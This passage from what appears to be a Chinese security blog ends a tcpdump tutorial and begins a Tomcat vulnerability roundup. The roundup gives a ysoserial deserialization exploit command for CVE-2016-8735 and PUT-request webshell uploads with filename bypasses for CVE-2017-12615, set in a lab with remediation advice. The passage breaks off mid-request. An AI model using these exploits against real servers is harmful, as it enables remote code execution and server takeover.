把编译出来的过滤器程序装载到分组捕获设备，同时引发用该过滤器选取的分组的捕获。</li>\n<li>pcap_datalink              返回分组捕获设备的数据链路类型。</li>\n</ul>\n<h4 id=\"协议注册\"><a href=\"#协议注册\" class=\"headerlink\" title=\"协议注册\"></a>协议注册</h4><p>对于以上介绍的协议，也只有在需要的时候才会注册，因为它毕竟增加了系统报文的处理速度并且会消耗大量的系统skb。当抓包开始的时候，它会创建一个对应的网络套接口，这种套接口的类型就是<code>af_packet</code>类型。相关实现参考C源码：<a href=\"http://lxr.linux.no/linux+v3.4/net/packet/af_packet.c\">af_packet.c</a>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">packet_create</span><span class=\"params\">(struct socket *sock, <span class=\"keyword\">int</span> protocol)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sock</span> *<span class=\"title\">sk</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">packet_opt</span> *<span class=\"title\">po</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> err;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!capable(CAP_NET_RAW))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> -EPERM;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sock-&gt;type != SOCK_DGRAM &amp;&amp; sock-&gt;type != SOCK_RAW</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SOCK_PACKET</span></span><br><span class=\"line\">     &amp;&amp; sock-&gt;type != SOCK_PACKET</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">     )</span><br><span class=\"line\">        <span class=\"keyword\">return</span> -ESOCKTNOSUPPORT;</span><br><span class=\"line\">    sock-&gt;state = SS_UNCONNECTED;</span><br><span class=\"line\">    err = -ENOBUFS;</span><br><span class=\"line\">    sk = sk_alloc(PF_PACKET, GFP_KERNEL, <span class=\"number\">1</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sk == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    sock-&gt;ops = &amp;packet_ops;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SOCK_PACKET</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sock-&gt;type == SOCK_PACKET)</span><br><span class=\"line\">        sock-&gt;ops = &amp;packet_ops_spkt;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">    sock_init_data(sock,sk);</span><br><span class=\"line\">    sk_set_owner(sk, THIS_MODULE);</span><br><span class=\"line\"></span><br><span class=\"line\">    po = sk-&gt;sk_protinfo = kmalloc(<span class=\"keyword\">sizeof</span>(*po), GFP_KERNEL);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!po)</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> out_free;</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(po, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(*po));</span><br><span class=\"line\">    sk-&gt;sk_family = PF_PACKET;</span><br><span class=\"line\">    po-&gt;num = protocol;</span><br><span class=\"line\"></span><br><span class=\"line\">    sk-&gt;sk_destruct = packet_sock_destruct;</span><br><span class=\"line\">    atomic_inc(&amp;packet_socks_nr);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">     *    Attach a protocol block</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    spin_lock_init(&amp;po-&gt;bind_lock);</span><br><span class=\"line\">    po-&gt;prot_hook.func = packet_rcv;       ----- 这个地方挂接处理函数，注册为packet_rcv。</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> CONFIG_SOCK_PACKET</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (sock-&gt;type == SOCK_PACKET)</span><br><span class=\"line\">        po-&gt;prot_hook.func = packet_rcv_spkt;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">    po-&gt;prot_hook.af_packet_priv = sk;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (protocol) &#123;</span><br><span class=\"line\">        po-&gt;prot_hook.type = protocol;</span><br><span class=\"line\">        dev_add_pack(&amp;po-&gt;prot_hook);      ----- dev_add_pack将协议加入到ptype_all链表中，具体参考下面函数代码</span><br><span class=\"line\">        sock_hold(sk);</span><br><span class=\"line\">        po-&gt;running = <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    write_lock_bh(&amp;packet_sklist_lock);</span><br><span class=\"line\">    sk_add_node(sk, &amp;packet_sklist);</span><br><span class=\"line\">    write_unlock_bh(&amp;packet_sklist_lock);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">out_free:</span><br><span class=\"line\">    sk_free(sk);</span><br><span class=\"line\">out:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> err;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Options\"><a href=\"#Options\" class=\"headerlink\" title=\"Options\"></a>Options</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> tcpdump -n -vvvv -i ens33 host 172.16.144.141 and port 80 -w web.pcap</span></span><br><span class=\"line\"></span><br><span class=\"line\">-n：不转换主机名、端口号（开启后看到的是IP地址，而不是主机名，实际使用中我们一般都比较关注服务器IP地址）</span><br><span class=\"line\">-v：显示详细信息，v越多信息越多</span><br><span class=\"line\">-i：指定网络接口，也就网卡的名字，常用的有eth0,eth1等，如果要监听所有网卡就是用-i any。</span><br><span class=\"line\">-w：抓取的包写入到文件，方便后续分析。实际中经常使用tcpdump抓包保存，然后使用Wireshark分析</span><br><span class=\"line\">-r：抓到的包也可以tcpdump打开再分析，tcpdump -n -vvvv -r data.cap</span><br><span class=\"line\">-c：指定抓取的包的数目</span><br><span class=\"line\">-s：指定抓取的数据的长度</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tcpdump/image-20200716175428104.png\" alt=\"image-20200716175428104\"></p>\n<p>Wireshark打开</p>\n<p><img src=\"/images/tcpdump/image-20200716184023410.png\" alt=\"image-20200716184023410\"></p>\n<h4 id=\"常见命令\"><a href=\"#常见命令\" class=\"headerlink\" title=\"常见命令\"></a>常见命令</h4><p>这部分简单演示了tcpdump的使用，如需常见语法可直接查看<code>基本语法</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"string\">&quot;GET&quot;</span>的十六进制是 47455420</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 监听对本地进行GET请求数据包</span></span><br><span class=\"line\">tcpdump -i ens33 &#x27;tcp[(tcp[12]&gt;&gt;2):4] = 0x47455420&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tcpdump/image-20200716185547770.png\" alt=\"image-20200716185547770\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"string\">&quot;SSH-&quot;</span>的十六进制是 0x5353482D</span></span><br><span class=\"line\">tcpdump -i ens33 &#x27;tcp[(tcp[12]&gt;&gt;2):4] = 0x5353482D&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tcpdump/image-20200716184806562.png\" alt=\"image-20200716184806562\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 截获DNS请求数据</span></span><br><span class=\"line\">tcpdump -i ens33 udp dst port 53</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 截获大于600字节</span></span><br><span class=\"line\">tcpdump -i ens33 &#x27;ip[2:2] &gt; 600&#x27;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"过滤器\"><a href=\"#过滤器\" class=\"headerlink\" title=\"过滤器\"></a>过滤器</h4><ul>\n<li><p>过滤器的关键词有：host、port、 net、src、 dst、icmp、tcp、udp、http</p>\n</li>\n<li><p>逻辑关键词：and、or、not</p>\n</li>\n<li><p>包头过滤</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp[tcpflags] &amp; tcp-syn != 0 and tcp[tcpflags] &amp; tcp-ack != 0</span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<h4 id=\"数据分析\"><a href=\"#数据分析\" class=\"headerlink\" title=\"数据分析\"></a>数据分析</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump: listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes</span><br><span class=\"line\">21:45:10.830435 IP (tos 0x0, ttl 64, id 63824, offset 0, flags [DF], proto TCP (6), length 60)</span><br><span class=\"line\">    18:54:59.000951 IP 172.16.144.1.64074 &gt; 172.16.144.141.http: Flags [P.], seq 352511301:352511594, ack 1460171085, win 4117, options [nop,nop,TS val 872905073 ecr 10965627], length 293: HTTP: GET /robots.txt HTTP/1.1</span><br></pre></td></tr></table></figure>\n\n<p><code>172.16.144.1.64074 &gt; 172.16.144.141.http</code> 这里源地址(<code>172.16.144.1.64074</code>)到目的地址(<code>172.16.144.141.http</code>)</p>\n<p><code>Flags [S]</code>是包的标志，<code>[S]</code>表示是<code>SYC</code>:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[S] – SYN (开始连接)</span><br><span class=\"line\">[.] – 没有标记 (一般是确认)</span><br><span class=\"line\">[P] – PSH (数据推送)</span><br><span class=\"line\">[F] – FIN (结束连接)</span><br><span class=\"line\">[R] – RST (重启连接)</span><br></pre></td></tr></table></figure>\n\n<p>为了提高网络效率，一个包也可以包含标志的组合，比如<code>[S.]</code>，<code>[FP.]</code></p>\n<ul>\n<li><code>seq</code>：同步序列编号，Synchronize Sequence Numbers；</li>\n<li><code>ack</code>：确认编号，Acknowledgement Number；</li>\n<li><code>win</code>：滑动窗口大小</li>\n<li><code>length</code>：承载的数据(payload)长度length，如果没有数据则为0</li>\n</ul>\n<p><img src=\"/images/tcpdump/1760830-e18fbb8480375fcd.jpeg\" alt=\"1760830-e18fbb8480375fcd\"></p>\n<h4 id=\"基本语法\"><a href=\"#基本语法\" class=\"headerlink\" title=\"基本语法\"></a>基本语法</h4><h5 id=\"1-过滤主机\"><a href=\"#1-过滤主机\" class=\"headerlink\" title=\"1.过滤主机\"></a>1.过滤主机</h5><p>抓取所有经过ens33，目的或源地址是172.16.144.141的网络数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 host 172.16.144.141</span><br></pre></td></tr></table></figure>\n\n<p>指定源地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 src host 172.16.144.141</span><br></pre></td></tr></table></figure>\n\n<p>指定目的地址</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 dst host 172.16.144.1</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-过滤端口\"><a href=\"#2-过滤端口\" class=\"headerlink\" title=\"2.过滤端口\"></a>2.过滤端口</h5><p>抓取所有经过ens33，目的或源端口是80的网络数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 port 80</span><br></pre></td></tr></table></figure>\n\n<p>指定源端口</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 src port 80</span><br></pre></td></tr></table></figure>\n\n<p>指定目的端口</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 dst port 80</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-网络过滤\"><a href=\"#3-网络过滤\" class=\"headerlink\" title=\"3.网络过滤\"></a>3.网络过滤</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 net 172.16</span><br><span class=\"line\">tcpdump -i ens33 src net 172.16</span><br><span class=\"line\">tcpdump -i ens33 dst net 172.16</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-协议过滤\"><a href=\"#4-协议过滤\" class=\"headerlink\" title=\"4.协议过滤\"></a>4.协议过滤</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 arp</span><br><span class=\"line\">tcpdump -i ens33 ip</span><br><span class=\"line\">tcpdump -i eth1 tcp</span><br><span class=\"line\">tcpdump -i eth1 udp</span><br><span class=\"line\">tcpdump -i eth1 icmp</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-表达式\"><a href=\"#5-表达式\" class=\"headerlink\" title=\"5.表达式\"></a>5.表达式</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">非 : ! or &quot;not&quot; (去掉双引号)  </span><br><span class=\"line\">且 : &amp;&amp; or &quot;and&quot;  </span><br><span class=\"line\">或 : || or &quot;or&quot;</span><br></pre></td></tr></table></figure>\n\n<p>抓取所有经过ens33，目的地址是172.16.144.141或172.16.141.1端口是80的TCP数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 &#x27;((tcp) and (port 80) and ((dst host 172.16.144.141) or (dst host 172.16.141.1)))&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>抓取所有经过ens33，目标MAC地址是00:0c:29:aa:b2:93的ICMP数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 &#x27;((icmp) and ((ether dst host 00:0c:29:aa:b2:93)))&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>抓取所有经过ens33，目的ip是172.16，但目的主机不是172.16.144.1的TCP数据</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i ens33 &#x27;((tcp) and ((dst net 172.16) and (not dst host 172.16.144.141)))&#x27;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"6-运维\"><a href=\"#6-运维\" class=\"headerlink\" title=\"6.运维\"></a>6.运维</h5><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -s 0 -w filename</span><br><span class=\"line\">-s 0是抓取完整数据包，否则默认只抓68字节</span><br></pre></td></tr></table></figure>\n\n<p><code>-c</code>参数对于运维人员来说也比较常用，因为流量比较大的服务器，靠人工CTRL+C还是抓的太多，甚至导致服务器宕机，于是可以用<code>-c</code>参数指定抓多少个包。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -nn -i ens33 &#x27;tcp[tcpflags] = tcp-syn&#x27; -c 10000</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"7-高级\"><a href=\"#7-高级\" class=\"headerlink\" title=\"7.高级\"></a>7.高级</h5><p>高级包头过滤可参考<a href=\"https://linuxwiki.github.io/NetTools/tcpdump.html\">这里</a></p>\n<h4 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h4><ul>\n<li>如果数据包中出现很多的<code>cksum 0xxxx incorrect</code>错误：是因为操作系统为了提高网络效率不再计算校验码，而是交给网卡计算</li>\n</ul>\n<h4 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Linux抓包原理:</span><br><span class=\"line\">https:&#x2F;&#x2F;www.iyunv.com&#x2F;thread-149869-1-1.html</span><br><span class=\"line\">tcpdump源码分析:</span><br><span class=\"line\">https:&#x2F;&#x2F;yq.aliyun.com&#x2F;articles&#x2F;573120</span><br><span class=\"line\">tcpdump语法:</span><br><span class=\"line\">https:&#x2F;&#x2F;linuxwiki.github.io&#x2F;NetTools&#x2F;tcpdump.html</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Tomcat漏洞汇总","date":"2020-08-13T09:38:54.000Z","_content":"\n### 介绍\n\nTomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。\n\n### 环境搭建\n\n```\nJava环境安装\nhttps://www.java.com/en/download/manual.jsp\nTomcat\nhttps://tomcat.apache.org/download-70.cgi\n以下部分漏洞环境可参考github每个漏洞介绍及实战都已提供。\n```\n\n1、下载并解压\n\n<img src=\"/images/tomcat/image-20200811143320510.png\" alt=\"image-20200811143320510\" style=\"zoom:50%;\" />\n\n2、双击执行启动服务\n\n```\nhttp://192.168.3.156:8080/\n```\n\n![image-20200811143448762](/images/tomcat/image-20200811143448762.png)\n\n#### Tomcat结构介绍\n\n下载解压后存在目录、文件信息：\n\n```shell\nbin-----存放Tomcat的脚本文件，例如启动、关闭\nconf----Tomcat的配置文件，例如server.xml和web.xml\nlib-----存放Tomcat运行需要的库文件（JAR包）\nlogs----存放Tomcat执行时的LOG文件\ntemp----存放Tomcat运行时所产生的临时文件\nwebapps-Web发布目录，默认情况下把Web应用文件放于此目录\nwork----存放jsp编译后产生的class文件\n```\n\n### 漏洞分类实战\n\n#### CVE-2016-8735\n\n##### 漏洞描述\n\nOracle修复了JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。 Tomcat也使用了JmxRemoteLifecycleListener这个监听器,但是Tomcat并没有及时升级，所以存在这个远程代码执行漏洞。\n\n##### 影响范围\n\nApache Tomcat 9.0.0.M1 to 9.0.0.M11 \n\nApache Tomcat 8.5.0 to 8.5.6 \n\nApache Tomcat 8.0.0.RC1 to 8.0.38 \n\nApache Tomcat 7.0.0 to 7.0.72 \n\nApache Tomcat 6.0.0 to 6.0.47\n\n##### 漏洞原理\n\n该漏洞的诱因存在于Oracle已经修复的JmxRemoteLifecycleListener反序列化漏洞(CVE-2016-3427)。因为Tomcat也使用了JmxRemoteLifecycleListener监听功能，但并没有及时升级，导致该远程代码执行漏洞。\n\n##### 漏洞条件\n\n1、要外部开启JmxRemoteLifecycleListener监听端口，实现远程利用。 \n\n```xml\nconf/server.xml\n<Listener className=\"org.apache.catalina.mbeans.JmxRemoteLifecycleListener\" rmiRegistryPortPlatform=\"10001\" rmiServerPortPlatform=\"10002\" />\n```\n\n![image-20200812101526860](/images/tomcat/image-20200812101526860.png)\n\n2、下载对应jar放到lib目录下：\n\n- catalina-jmx-remote.jar要与对应tomcat版本一致[不同版本下载](https://archive.apache.org/dist/tomcat/)一般存在extras文件下，如下图所示\n- [groovy2.3.9](https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9)下载版本最好为2.3.9（经过测试2.3.0到2.4.0-beta-4）\n\n![image-20200812102130773](/images/tomcat/image-20200812102130773.png)\n\n![image-20200811163431177](/images/tomcat/image-20200811163431177.png)\n\n3、接着修改bin/catalina.bat，在Execute The Requested Command处上面添加\n\n```java\nset CATALINA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false\n```\n\n- -Dcom.sun.management.jmxremote.ssl=false 指定是否使用SSL通讯\n- -Dcom.sun.management.jmxremote.authenticate=false 指定是否需要密码验证\n\n![image-20200812101910590](/images/tomcat/image-20200812101910590.png)\n\n4、服务启动\n\n下图所示：服务已启动10001端口已启动\n\n![image-20200812103050881](/images/tomcat/image-20200812103050881.png)\n\n##### 漏洞检测\n\n1、执行以下PoC\n\n```java\njava -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.3.165 10001 Groovy1 calc.exe\n```\n\nJava 1.8出现报错\n\n![image-20200812104703039](/images/tomcat/image-20200812104703039.png)\n\n1.7的jdk成功弹出计算器\n\n![PoC](/images/tomcat/PoC.gif)\n\n##### 漏洞修复\n\n紧急措施：关闭JmxRemoteLifecycleListener功能，或者是对jmx JmxRemoteLifecycleListener远程端口进行网络访问控制。同时，增加严格的认证方式。\n\n升级jdk（目前测试1.8是无法利用）\n\n推荐方案：官方已经发布了版本更新，建议您升级到最新版本。\n\n- Apache Tomcat 9.0.0.M13或更新版本(Apache Tomcat 9.0.0.M12也修复了此漏洞，但并未发布)\n\n- Apache Tomcat 8.5.8或更新版本(Apache Tomcat 8.5.7也修复了此漏洞，但并未发布)\n\n- Apache Tomcat 8.0.39或更新版本\n\n- Apache Tomcat 7.0.73或更新版本\n\n- Apache Tomcat 6.0.48或更新版本\n\n  \n\n#### CVE-2017-12615\n\n##### 漏洞描述\n\n远程代码执行漏洞(CVE-2017-12615)。当存在漏洞的Tomcat 运行在 Windows 主机上，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。\n\n##### 影响范围\n\nApache Tomcat 7.0.0 – 7.0.79\n\n##### 漏洞原理\n\n启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false）,可任意上传恶意文件至服务器端\n\n默认`readonly`为`true`，也就是无法进行PUT、DELETE行为\n\n````\nconf/web.xml\t\t//文件内容\n````\n\n![image-20200813095843352](/images/tomcat/image-20200813095843352.png)\n\n这个CVE漏洞涉及到 DefaultServlet，DefaultServlet作用是处理静态文件，同时DefaultServlet可以处理PUT或DELETE请求，默认配置如图2：\n\n![image-20200813100218371](/images/tomcat/image-20200813100218371.png)\n\n可以看出即使设置readonly为false,默认tomcat也不允许PUT上传jsp和jspx文件，因为后端都用org.apache.catalina.servlets.JspServlet来处理jsp或是jspx后缀的请求，而JspServlet负责处理所有JSP和JPSX类型的动态请求，从代码没有发现处理HTTP PUT类型的操作, 所以可知PUT以及DELTE等HTTP操作由DefautServelt实现。因此，就算我们构造请求直接上传JSP webshell显然是不会成功的。该漏洞实际上是利用了windows下文件名解析的漏洞来触发的。根本是通过构造特殊后缀名，绕过Tomcat检测，让Tomcat用DefaultServlet的逻辑处理请求，从而上传jsp webshell文件。\n\n绕过方式：\n\nWindows：\n1、利用/shell.jsp::$DATA的方式绕过\n2、/shell.jsp%20，空格绕过\n3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/\nLinux：\n1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/\n\n##### 漏洞条件\n\n`readonly`设置为`false`时会导致攻击者上传任意恶意文件。\n\n##### 漏洞检测\n\n漏洞环境使用[P牛docker](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615)镜像验证。\n\nTomcat version: 8.5.19\n\n![image-20200813140738965](/images/tomcat/image-20200813140738965.png)\n\n将readonly参数设置为false时，即可通过PUT方式创建一个JSP文件，并可以执行任意代码。修改部分如下。\n\n1、readonly默认值为true，手动将其改为false，在`conf/web.xml`中手动添加红色方框类内容。\n\n添加如下：\n\n```xml\n\t\t\t\t<init-param> \n            <param-name>readonly</param-name> \n            <param-value>false</param-value> \n        </init-param>\n```\n\n![image-20200813100605923](/images/tomcat/image-20200813100605923.png)\n\n2、修改请求头并传递post数据\n\n```\nPUT /shell.jsp HTTP/1.1\nHost: 192.168.3.49:8080\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nContent-Length: 5\n\nshell\n```\n\n![image-20200813131648712](/images/tomcat/image-20200813131648712.png)\n\n由上图看到提示404，说明JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。会被过滤掉。\n\n此时可以利用上面介绍的绕过方式\n\n利用文件解析漏洞采用PUT方式上传jsp webshell文件。其中文件名设为/shell.jsp/。（如果文件名后缀是空格那么将会被tomcat给过滤掉。）\n\n```\nPUT /shell.jsp/ HTTP/1.1\nHost: 192.168.3.49:8080\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:77.0) Gecko/20100101 Firefox/77.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: 